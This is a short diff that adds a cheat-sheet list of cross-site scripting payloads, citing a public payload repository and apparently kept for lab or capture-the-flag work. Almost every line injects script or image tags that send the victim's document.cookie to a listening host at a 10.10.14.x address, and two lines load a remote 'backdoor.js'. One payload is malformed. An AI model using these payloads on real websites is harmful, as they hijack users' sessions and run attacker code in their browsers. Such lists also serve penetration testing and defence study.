@@ -1,0 +1,15 @@
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
+
+<script src=http://10.10.14.20/backdoor.js></script>
+<script>document.write('<img src="http://10.10.14.36/?c='+document.cookie%2b'"/>');</script>
+<img src=x onerror="this.src='http://10.10.14.36/?c='+document.cookie;"/>
+
+<img src=x onerror="location='http://10.10.14.36/?c='+document.cookie;"/>
+<script>document.location="http://10.10.14.36/?c="+document.cookie;</script>
+
+
+<img src=http://10.10.14.20/diego.jpeg />
+<img src=x onerror=this.src="http://10.10.14.20/?cookie=" btoa(document.cookie) />
+<script src=http://10.10.14.20/backdoor.js></script>
